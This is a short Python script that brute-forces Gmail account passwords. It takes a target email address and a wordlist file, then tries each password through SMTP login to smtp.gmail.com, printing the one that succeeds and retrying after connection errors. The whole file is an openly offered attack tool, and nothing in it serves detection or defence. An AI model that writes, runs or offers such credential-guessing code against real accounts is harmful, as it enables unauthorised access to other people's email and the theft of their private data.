import smtplib #the SMTP library required for the connection
import time #time import

global emailUser
global emailPass
global filePass

def serve():
    global server
    server = smtplib.SMTP("smtp.gmail.com", 587) #connects to the SMTP server with the port
    server.ehlo()#lets the server know that you're there
    server.starttls()#starts a connection with the server
serve()
emailUser = input("Enter an email address you wish to try to break: ")#username
emailPass = input("Enter a text file for brute force: ")#passfile for brute force
filePass = open(emailPass, 'r')#loads the specified file

def hack():
    for password in filePass:#for each password in the file...
        try:
            server.login(emailUser,password)#try to login with the user and pass
            print("+   Password found   + : ", password)#if password found
            break#exit loop

        except smtplib.SMTPAuthenticationError:#catch error, credentials incorrect
            print("-   Password incorrect   - : ", password)#if incorrect password
            time.sleep(0.001)#wait 0.001 seconds between each try
        except smtplib.SMTPConnectError:
            print("Warning, hacking may or may not continue after this point")
            time.sleep(5)
            hack()
        except smtplib.SMTPDataError:
            print("Warning, hacking may or may not continue after this point")
            time.sleep(5)
            hack()
        except smtplib.SMTPServerDisconnected:
            print("Warning, hacking may or may not continue after this point")
            time.sleep(5)
            serve()
            hack()

hack()
